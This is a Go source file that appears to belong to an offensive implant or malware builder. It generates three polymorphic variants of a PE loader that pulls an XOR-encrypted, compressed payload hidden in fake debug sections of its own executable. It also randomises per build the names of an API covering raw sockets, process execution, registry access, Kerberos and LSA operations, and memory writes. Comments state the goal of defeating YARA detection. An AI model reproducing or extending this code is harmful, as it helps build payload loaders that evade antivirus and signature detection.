func (pc *polyConfig) peLoaderSectionCheck() string {
	return fmt.Sprintf(`strings.HasPrefix(nm, %s)`, pc.PrefixVar)
}

// peLoaderPrefixDecl generates the package-level prefix string variable.
// Uses the payload XOR key (a package-level array) to derive ".zd" at runtime.
// The compiler CANNOT constant-fold this because the key is an array
// (not a local constant), and the XOR operands span a loop/index.
func (pc *polyConfig) peLoaderPrefixDecl() string {
	k := pc.PayloadKey
	// ".zd" = {0x2e, 0x7a, 0x64}, XOR'd with bytes from the payload key.
	b0 := byte(0x2e) ^ k[0]
	b1 := byte(0x7a) ^ k[1]
	b2 := byte(0x64) ^ k[2]
	// Derive prefix from the payload key array at runtime.
	// The compiler sees: keyVar[0] ^ constant, keyVar[1] ^ constant, ...
	// This references a package-level array → not constant-foldable.
	return fmt.Sprintf("var %s = string([]byte{%s[0] ^ 0x%02x, %s[1] ^ 0x%02x, %s[2] ^ 0x%02x})\n",
		pc.PrefixVar, pc.PayloadKeyVar, b0, pc.PayloadKeyVar, b1, pc.PayloadKeyVar, b2)
}

// peLoaderVariantA: forward scan, separate decompress function.
func (pc *polyConfig) peLoaderVariantA() string {
	marker := fmt.Sprintf("0x%08X", pc.PayloadMarker)
	secName := pc.PayloadSection
	check := pc.peLoaderSectionCheck()
	return pc.peLoaderPrefixDecl() + fmt.Sprintf(`func %s() []byte {
	p, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	raw, err := os.ReadFile(p)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	f, err := pe.Open(p)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	defer f.Close()
	if data := %s(raw, f, %s); data != nil {
		return data
	}
	if data := %s(raw, f, %q); data != nil {
		return data
	}
	fmt.Fprintf(os.Stderr, "init failed\n")
	os.Exit(1)
	return nil
}

func %s(raw []byte, f *pe.File, mk uint32) []byte {
	var lengths []uint32
	var debugSecs []*pe.Section
	for _, s := range f.Sections {
		nm := s.Name
		if %s {
			debugSecs = append(debugSecs, s)
		}
	}
	if len(debugSecs) == 0 {
		return nil
	}
	s0 := debugSecs[0]
	base := int(s0.Offset)
	vs := int(s0.VirtualSize)
	for hp := base + vs - 5; hp >= base && hp >= base+vs-256; hp-- {
		if hp+4 > len(raw) { break }
		m := uint32(raw[hp]) | uint32(raw[hp+1])<<8 | uint32(raw[hp+2])<<16 | uint32(raw[hp+3])<<24
		if m != mk { continue }
		n := int(raw[hp+4])
		if n < 1 || n > 20 || hp+5+n*4 > len(raw) { break }
		lengths = make([]uint32, n)
		for i := 0; i < n; i++ {
			lp := hp + 5 + i*4
			lengths[i] = uint32(raw[lp]) | uint32(raw[lp+1])<<8 | uint32(raw[lp+2])<<16 | uint32(raw[lp+3])<<24
		}
		break
	}
	if len(lengths) == 0 || len(debugSecs) < len(lengths) {
		return nil
	}
	var assembled []byte
	for i, cl := range lengths {
		if cl == 0 || i >= len(debugSecs) {
			continue
		}
		s := debugSecs[i]
		off := int(s.Offset)
		vs := int(s.VirtualSize)
		start := off + vs - int(cl)
		if i == 0 {
			hdrSz := 5 + len(lengths)*4
			start = off + vs - hdrSz - int(cl)
		}
		if start < off || start+int(cl) > len(raw) {
			continue
		}
		assembled = append(assembled, raw[start:start+int(cl)]...)
	}
	return %s(assembled)
}

func %s(raw []byte, f *pe.File, secName string) []byte {
	for _, s := range f.Sections {
		if s.Name != secName {
			continue
		}
		off := int(s.Offset)
		vs := int(s.VirtualSize)
		if vs == 0 || off+vs > len(raw) {
			continue
		}
		return %s(raw[off:off+vs])
	}
	return nil
}

func %s(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}
	for i := range data { data[i] ^= %s[i%%32] }
	r, err := zlib.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil
	}
	defer r.Close()
	out, err := io.ReadAll(r)
	if err != nil {
		return nil
	}
	return out
}`, pc.LoaderFunc, pc.LoaderDistFunc, marker, pc.LoaderSingleFunc, secName,
		pc.LoaderDistFunc, check, pc.LoaderDecompFunc,
		pc.LoaderSingleFunc, pc.LoaderDecompFunc,
		pc.LoaderDecompFunc, pc.PayloadKeyVar)
}

// peLoaderVariantB: collect all sections into a slice first, then process.
// Uses bytes.Buffer + io.Copy instead of io.ReadAll for decompression.
func (pc *polyConfig) peLoaderVariantB() string {
	marker := fmt.Sprintf("0x%08X", pc.PayloadMarker)
	secName := pc.PayloadSection
	check := pc.peLoaderSectionCheck()
	return pc.peLoaderPrefixDecl() + fmt.Sprintf(`func %s() []byte {
	p, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	raw, err := os.ReadFile(p)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	f, err := pe.Open(p)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	defer f.Close()
	if data := %s(raw, f, %s); data != nil {
		return data
	}
	if data := %s(raw, f, %q); data != nil {
		return data
	}
	fmt.Fprintf(os.Stderr, "init failed\n")
	os.Exit(1)
	return nil
}

func %s(raw []byte, f *pe.File, mk uint32) []byte {
	type secInfo struct {
		offset int
		vsize  int
	}
	var secs []secInfo
	for _, s := range f.Sections {
		nm := s.Name
		if %s {
			secs = append(secs, secInfo{int(s.Offset), int(s.VirtualSize)})
		}
	}
	if len(secs) == 0 {
		return nil
	}
	var lengths []uint32
	s0 := secs[0]
	for hp := s0.offset + s0.vsize - 5; hp >= s0.offset && hp >= s0.offset+s0.vsize-256; hp-- {
		if hp+4 > len(raw) { break }
		m := uint32(raw[hp]) | uint32(raw[hp+1])<<8 | uint32(raw[hp+2])<<16 | uint32(raw[hp+3])<<24
		if m != mk { continue }
		n := int(raw[hp+4])
		if n < 1 || n > 20 || hp+5+n*4 > len(raw) { break }
		lengths = make([]uint32, n)
		for i := 0; i < n; i++ {
			lp := hp + 5 + i*4
			lengths[i] = uint32(raw[lp]) | uint32(raw[lp+1])<<8 | uint32(raw[lp+2])<<16 | uint32(raw[lp+3])<<24
		}
		break
	}
	if len(lengths) == 0 || len(secs) < len(lengths) {
		return nil
	}
	var assembled []byte
	for i, cl := range lengths {
		if cl == 0 || i >= len(secs) {
			continue
		}
		si := secs[i]
		start := si.offset + si.vsize - int(cl)
		if i == 0 {
			hdrSz := 5 + len(lengths)*4
			start = si.offset + si.vsize - hdrSz - int(cl)
		}
		if start < si.offset || start+int(cl) > len(raw) {
			continue
		}
		assembled = append(assembled, raw[start:start+int(cl)]...)
	}
	return %s(assembled)
}

func %s(raw []byte, f *pe.File, secName string) []byte {
	for _, s := range f.Sections {
		if s.Name != secName {
			continue
		}
		off := int(s.Offset)
		vs := int(s.VirtualSize)
		if vs == 0 || off+vs > len(raw) {
			continue
		}
		return %s(raw[off:off+vs])
	}
	return nil
}

func %s(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}
	for i := range data { data[i] ^= %s[i%%32] }
	r, err := zlib.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil
	}
	defer r.Close()
	var buf bytes.Buffer
	if _, err := io.Copy(&buf, r); err != nil {
		return nil
	}
	return buf.Bytes()
}`, pc.LoaderFunc, pc.LoaderDistFunc, marker, pc.LoaderSingleFunc, secName,
		pc.LoaderDistFunc, check, pc.LoaderDecompFunc,
		pc.LoaderSingleFunc, pc.LoaderDecompFunc,
		pc.LoaderDecompFunc, pc.PayloadKeyVar)
}

// peLoaderVariantC: reverse section iteration, manual read loop for decompression.
func (pc *polyConfig) peLoaderVariantC() string {
	marker := fmt.Sprintf("0x%08X", pc.PayloadMarker)
	secName := pc.PayloadSection
	check := pc.peLoaderSectionCheck()
	return pc.peLoaderPrefixDecl() + fmt.Sprintf(`func %s() []byte {
	p, err := os.Executable()
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	raw, err := os.ReadFile(p)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	f, err := pe.Open(p)
	if err != nil {
		fmt.Fprintf(os.Stderr, "init: %%v\n", err)
		os.Exit(1)
	}
	defer f.Close()
	if data := %s(raw, f, %s); data != nil {
		return data
	}
	if data := %s(raw, f, %q); data != nil {
		return data
	}
	fmt.Fprintf(os.Stderr, "init failed\n")
	os.Exit(1)
	return nil
}

func %s(raw []byte, f *pe.File, mk uint32) []byte {
	n := len(f.Sections)
	debugIdx := make([]int, 0, n)
	for i := n - 1; i >= 0; i-- {
		nm := f.Sections[i].Name
		if %s {
			debugIdx = append(debugIdx, i)
		}
	}
	// Reverse to restore original order.
	for l, r := 0, len(debugIdx)-1; l < r; l, r = l+1, r-1 {
		debugIdx[l], debugIdx[r] = debugIdx[r], debugIdx[l]
	}
	if len(debugIdx) == 0 {
		return nil
	}
	s0 := f.Sections[debugIdx[0]]
	base := int(s0.Offset)
	vs := int(s0.VirtualSize)
	var lengths []uint32
	for hp := base + vs - 5; hp >= base && hp >= base+vs-256; hp-- {
		if hp+4 > len(raw) { break }
		m := uint32(raw[hp]) | uint32(raw[hp+1])<<8 | uint32(raw[hp+2])<<16 | uint32(raw[hp+3])<<24
		if m != mk { continue }
		cnt := int(raw[hp+4])
		if cnt < 1 || cnt > 20 || hp+5+cnt*4 > len(raw) { break }
		lengths = make([]uint32, cnt)
		for i := 0; i < cnt; i++ {
			lp := hp + 5 + i*4
			lengths[i] = uint32(raw[lp]) | uint32(raw[lp+1])<<8 | uint32(raw[lp+2])<<16 | uint32(raw[lp+3])<<24
		}
		break
	}
	if len(lengths) == 0 || len(debugIdx) < len(lengths) {
		return nil
	}
	var assembled []byte
	for i, cl := range lengths {
		if cl == 0 || i >= len(debugIdx) {
			continue
		}
		s := f.Sections[debugIdx[i]]
		off := int(s.Offset)
		vs := int(s.VirtualSize)
		start := off + vs - int(cl)
		if i == 0 {
			hdrSz := 5 + len(lengths)*4
			start = off + vs - hdrSz - int(cl)
		}
		if start < off || start+int(cl) > len(raw) {
			continue
		}
		assembled = append(assembled, raw[start:start+int(cl)]...)
	}
	return %s(assembled)
}

func %s(raw []byte, f *pe.File, secName string) []byte {
	for i := len(f.Sections) - 1; i >= 0; i-- {
		s := f.Sections[i]
		if s.Name != secName {
			continue
		}
		off := int(s.Offset)
		vs := int(s.VirtualSize)
		if vs == 0 || off+vs > len(raw) {
			continue
		}
		return %s(raw[off:off+vs])
	}
	return nil
}

func %s(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}
	for i := range data { data[i] ^= %s[i%%32] }
	r, err := zlib.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil
	}
	defer r.Close()
	result := make([]byte, 0, len(data)*4)
	tmp := make([]byte, 32*1024)
	for {
		n, readErr := r.Read(tmp)
		if n > 0 {
			result = append(result, tmp[:n]...)
		}
		if readErr != nil {
			break
		}
	}
	return result
}`, pc.LoaderFunc, pc.LoaderDistFunc, marker, pc.LoaderSingleFunc, secName,
		pc.LoaderDistFunc, check, pc.LoaderDecompFunc,
		pc.LoaderSingleFunc, pc.LoaderDecompFunc,
		pc.LoaderDecompFunc, pc.PayloadKeyVar)
}

// ──────────────────────────────────────────────────────────────────────
// Random helpers — use crypto/rand for unpredictable selections.
// ──────────────────────────────────────────────────────────────────────

func randInt(max int) (int, error) {
	if max <= 0 {
		return 0, fmt.Errorf("crypto/rand: argument to Int is <= 0")
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		return 0, fmt.Errorf("crypto/rand: %w", err)
	}
	return int(n.Int64()), nil
}

func randChoice(pool []string) (string, error) {
	i, err := randInt(len(pool))
	if err != nil {
		return "", err
	}
	return pool[i], nil
}

func randChoiceExcluding(pool []string, exclude ...string) (string, error) {
	excludeSet := make(map[string]bool, len(exclude))
	for _, e := range exclude {
		excludeSet[e] = true
	}
	return randChoiceExcludingMap(pool, excludeSet)
}

func randChoiceExcludingMap(pool []string, exclude map[string]bool) (string, error) {
	filtered := make([]string, 0, len(pool))
	for _, s := range pool {
		if !exclude[s] {
			filtered = append(filtered, s)
		}
	}
	if len(filtered) == 0 {
		return "", fmt.Errorf("no choices remaining after exclusions")
	}
	return randChoice(filtered)
}

// ──────────────────────────────────────────────────────────────────────
// Export name randomization — per-build unique WASM function names
// ──────────────────────────────────────────────────────────────────────

// exportedAnonymizedNames lists all the current anonymized export names
// from internal/names/names.go (the VALUES of the Exports map).
// These are the names that appear in the WASM import section and the
// host binary's .rdata section. Per-build randomization defeats YARA
// rules that match this static set of names.
var exportedAnonymizedNames = []string{
	// Networking
	"fd_open", "fd_bind", "fd_listen", "fd_connect", "fd_accept",
	"fd_read2", "fd_write2", "fd_close2", "fd_sendto", "fd_recvfrom",
	"fd_shutdown", "fd_setsockopt", "fd_getsockopt", "fd_getpeername",
	"fd_getsockname", "addr_resolve",
	// Raw sockets
	"fd_raw_open", "fd_raw_send", "fd_raw_recv",
	// OS proxies
	"sys_hostname", "sys_getwd", "sys_chdir", "sys_user", "sys_pid",
	"sys_procs", "proc_exec", "proc_start", "proc_wait", "sys_netifs",
	// Pipes
	"fd_pipe", "fd_pread", "fd_pwrite", "fd_pclose",
	// Module / DLL
	"mod_available", "mod_load", "mod_resolve", "mod_call", "mod_invoke",
	"mod_free", "mod_close",
	// Registry
	"reg_open", "reg_close", "reg_query", "reg_set", "reg_delete", "reg_enum",
	// Filesystem
	"fs_create", "fs_read", "fs_write", "fs_getattr", "fs_setattr", "fs_findfiles",
	// Process
	"sys_compname", "proc_create", "proc_open", "proc_term",
	// Security / tokens
	"sec_opentoken", "sec_tokeninfo", "svc_open", "svc_status",
	// NativeAOT-specific (SDDL, LSA, RPC, WMI, filesystem, crypto, networking)
	"sec_parsesddl", "sec_sddl", "sec_enumrights", "sec_enumsessions", "lsa_kerbop", "net_adapters", "rpc_enumeps", "wmi_query",
	"ver_info", "reg_enumvals",
	"fs_listdir", "fs_exists", "fs_read_all", "reg_modifiable", "sc_modifiable", "proc_modules",
	"crypto_kerbhash", "crypto_kerbenc", "crypto_kerbdec", "crypto_kerbcksum",
	"net_tcpsendrecv", "net_ldapsearch", "net_getdc",
	// Host memory
	"mem_alloc", "mem_protect", "mem_free", "mem_write", "mem_read",
	"mem_write32", "mem_write64", "mem_read32", "mem_read64", "mem_addr",
	"mem_proc", "mod_addr",
	// Extension API
	"ext_getfunc", "ext_readout", "ext_resetout", "ext_callback",
	// Shadow memory
	"shm_alloc", "shm_protect", "shm_free", "shm_host_addr", "shm_call_entry",
	// Darwin / macOS frameworks
	"fw_available", "fw_load", "fw_sym", "fw_call", "fw_call_m", "fw_call_raw",
	"fw_mem_r", "fw_mem_w",
	// Darwin / callbacks
	"fw_cb_create", "fw_cb_addr", "fw_cb_wait", "fw_cb_ret", "fw_cb_free",
	"fw_cstr_r",
	// Darwin / blocks
	"fw_blk_create", "fw_blk_release", "fw_blk_addr",
}

// generateExportNameMap builds a map from each current anonymized export
// name to a fresh per-build random name. When a ghost profile is provided,
// authentic function names from the profiled binary are used. Otherwise
// wordList produces natural-sounding Go identifiers (e.g., "parseBuffer",
// "loadConfig") instead of suspicious alphanumeric strings ("a7_bx3").
func generateExportNameMap(ghost *GhostProfile, used map[string]bool) (map[string]string, error) {
	wl := newWordList()
	m := make(map[string]string, len(exportedAnonymizedNames))
	for _, name := range exportedAnonymizedNames {
		var newName string
		if ghost != nil {
			newName = ghost.FunctionName(used)
		} else {
			newName = wl.generate(used)
		}
		m[name] = newName
	}
	return m, nil
}

// wasiPreview1FunctionNames lists all WASI snapshot_preview1 function names.
// These appear as import field names in the WASM binary and as string
// constants in the wazero fork's WASI implementation.
var wasiPreview1FunctionNames = []string{
	"args_get", "args_sizes_get",
	"environ_get", "environ_sizes_get",
	"clock_res_get", "clock_time_get",
	"fd_advise", "fd_allocate", "fd_close", "fd_datasync",
	"fd_fdstat_get", "fd_fdstat_set_flags", "fd_fdstat_set_rights",
	"fd_filestat_get", "fd_filestat_set_size", "fd_filestat_set_times",
	"fd_pread", "fd_prestat_get", "fd_prestat_dir_name", "fd_pwrite",
	"fd_read", "fd_readdir", "fd_renumber", "fd_seek", "fd_sync",
	"fd_tell", "fd_write",
	"path_create_directory", "path_filestat_get", "path_filestat_set_times",
	"path_link", "path_open", "path_readlink", "path_remove_directory",
	"path_rename", "path_symlink", "path_unlink_file",
	"poll_oneoff", "proc_exit", "proc_raise",
	"random_get", "sched_yield",
	"sock_accept", "sock_recv", "sock_send", "sock_shutdown",
}

// generateWASINameMap creates per-build random names for all WASI functions.
// When a ghost profile is provided, authentic function names are used.
func generateWASINameMap(ghost *GhostProfile, wl *wordList, used map[string]bool) map[string]string {
	m := make(map[string]string, len(wasiPreview1FunctionNames))
	for _, name := range wasiPreview1FunctionNames {
		if ghost != nil {
			m[name] = ghost.FunctionName(used)
		} else {
			m[name] = wl.generate(used)
		}
	}
	return m
}
